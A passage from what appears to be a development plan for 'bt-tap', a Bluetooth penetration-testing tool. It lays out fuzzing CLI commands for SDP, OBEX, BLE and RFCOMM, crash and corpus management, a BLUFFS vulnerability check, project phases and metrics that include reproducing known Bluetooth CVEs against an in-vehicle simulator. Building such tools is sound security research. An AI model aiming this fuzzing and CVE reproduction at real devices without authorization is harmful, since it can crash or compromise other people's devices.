              type=click.Choice(["sdp", "obex-pbap", "obex-map", "obex-opp",
                                 "at-hfp", "at-phonebook", "at-sms",
                                 "ble-att", "ble-smp", "bnep", "rfcomm", "all"]),
              default=["all"])
@click.option("--strategy", "-s", default="random",
              type=click.Choice(["random", "targeted", "coverage", "state-machine"]))
@click.option("--duration", "-d", default="1h", help="Duration: 30m, 1h, 24h, 7d")
@click.option("--iterations", "-n", default=None, type=int)
@click.option("--resume", is_flag=True)
def fuzz_campaign(address, protocol, strategy, duration, iterations, resume): ...
```

### TASK 4.2: Protocol-Specific Commands

```python
@fuzz.command("obex")  # bt-tap fuzz obex <addr> --profile pbap
@fuzz.command("ble-att")  # bt-tap fuzz ble-att <addr> --mode handles
@fuzz.command("ble-smp")  # bt-tap fuzz ble-smp <addr> --mode pairing
@fuzz.command("bnep")  # bt-tap fuzz bnep <addr>
@fuzz.command("rfcomm-raw")  # bt-tap fuzz rfcomm-raw <addr>
```

### TASK 4.3: Crash Management

```python
@fuzz.group("crashes")
def fuzz_crashes(): ...

@fuzz_crashes.command("list")  # bt-tap fuzz crashes list
@fuzz_crashes.command("replay")  # bt-tap fuzz crashes replay <id>
@fuzz_crashes.command("export")  # bt-tap fuzz crashes export --format json
@fuzz_crashes.command("minimize")  # bt-tap fuzz crashes minimize <id>
```

### TASK 4.4: Corpus Management

```python
@fuzz.group("corpus")
def fuzz_corpus(): ...

@fuzz_corpus.command("generate")  # bt-tap fuzz corpus generate --protocol sdp
@fuzz_corpus.command("import")  # bt-tap fuzz corpus import capture.pcap
@fuzz_corpus.command("list")  # bt-tap fuzz corpus list
@fuzz_corpus.command("minimize")  # bt-tap fuzz corpus minimize
```

---

## EPIC 5: Report Integration

### TASK 5.1: Fuzz Results in Report

Add to `bt_tap/report/generator.py`:

```python
def add_fuzz_campaign_results(self, campaign_stats: dict, crashes: list[dict]):
    """Add fuzzing campaign results to report."""
    # Campaign summary: duration, packets, crashes, protocols
    # Crash table: severity, protocol, type, payload preview, reproducible
```

### TASK 5.2: Vuln Scanner Updates

Add BLUFFS (CVE-2023-24023) check to `bt_tap/attack/vuln_scanner.py`:

```python
def _check_bluffs(self, bt_version: float | None) -> dict | None:
    if bt_version and bt_version < 5.4:
        return _finding("MEDIUM", "BLUFFS Session Key Derivation (CVE-2023-24023)",
                        "BT version < 5.4 susceptible to BLUFFS session key attacks",
                        cve="CVE-2023-24023", status="potential")
```

---

## EPIC 6: Advanced Features (Post-MVP)

### TASK 6.1: pcap/btsnoop Replay
- Parse btsnoop header (16 bytes) and records (orig_len + incl_len + flags + drops + ts + data)
- Extract protocol payloads as corpus seeds
- Selective frame replay against target

### TASK 6.2: Bumble Integration
- Optional dependency for L2CAP signaling fuzzing
- `BumbleTransport` class wrapping Bumble's user-space BLE stack
- L2CAP config option injection

### TASK 6.3: Crash Minimization
- Binary search: halve payload until crash disappears, then refine
- Field-level: zero each field individually, test if still crashes
- Output: minimal reproduction payload

### TASK 6.4: Distributed Fuzzing
- Corpus sharing via shared filesystem or simple TCP
- Crash deduplication across instances
- Coordinator assigns protocol ranges to workers

---

## Implementation Phases

| Phase | Weeks | Tasks | Deliverable |
|-------|-------|-------|-------------|
| **1: Foundation + Quick Wins** | 1-2 | 1.1, 1.2, 1.3, 2.3, 1.6 | Transport, CrashDB, Mutators, AT corpus (200+ patterns), backward compat |
| **2: OBEX Fuzzer** | 3-4 | 2.2, 3.4 (OBEX), 4.2.1 | Full OBEX builder, state machine fuzzing, `bt-tap fuzz obex` |
| **3: SDP + BNEP** | 5 | 2.1, 2.6, 3.2 | SDP builder with CVE-2017-0785 reproduction, BNEP builder |
| **4: BLE Fuzzing** | 6-7 | 2.4, 2.5, 1.4, 4.2.2-3 | ATT + SMP builders, corpus management, BLE CLI |
| **5: Campaign Engine** | 8 | 1.5, 3.1, 3.3, 4.1 | Long-running campaigns, coverage-guided, Rich dashboard |
| **6: RFCOMM + L2CAP** | 9 | 2.7, 2.8, 4.2.4-5 | Raw RFCOMM frames, L2CAP signaling (Bumble optional) |
| **7: Report + Polish** | 10 | 5.1, 5.2, 4.3, 4.4 | Report integration, BLUFFS check, crash/corpus CLI |
| **8: Advanced** | 11+ | 6.1-6.4 | pcap replay, Bumble integration, crash minimization |

---

## Dependencies

### pyproject.toml Changes

```toml
[project.optional-dependencies]
dev = ["pytest", "ruff"]
audio = ["pulsectl>=23.5"]
fuzz = ["bumble>=0.0.189"]  # Optional: for L2CAP signaling fuzzing
```

### No New Required Dependencies

Core fuzzing uses only:
- Python `socket` module (built-in) — L2CAP, RFCOMM sockets
- Python `struct` module (built-in) — packet construction
- Python `sqlite3` module (built-in) — crash database
- Python `hashlib` module (built-in) — deduplication
- Existing BT-Tap deps: `click`, `rich` — CLI and display

---

## Success Metrics

| Metric | Target |
|--------|--------|
| Protocol-aware fuzz generators | 8 protocols (SDP, OBEX, AT, ATT, SMP, BNEP, RFCOMM, L2CAP) |
| Total fuzz cases in built-in corpus | 500+ across all protocols |
| AT command patterns | 200+ (up from 5) |
| Campaign stability | 24-hour campaigns without fuzzer crash |
| Crash reproduction rate | >90% of logged crashes reproducible from DB |
| CVE pattern reproduction | CVE-2017-0785, CVE-2017-0781, SweynTooth, CVE-2018-5383 |
| New crash discovery | At least 1 crash per protocol against IVI simulator |
| Packets per second | >100 pps sustained (protocol-dependent) |

---

## Task Count Summary

| Epic | Tasks | Subtasks |
|------|-------|----------|
| 1: Infrastructure | 6 | 28 |
| 2: Protocol Builders | 8 | 67 |
| 3: Strategies | 4 | 14 |
| 4: CLI Integration | 4 | 14 |
| 5: Report Integration | 2 | 5 |
| 6: Advanced (Post-MVP) | 4 | 10 |
| **TOTAL** | **28** | **138** |
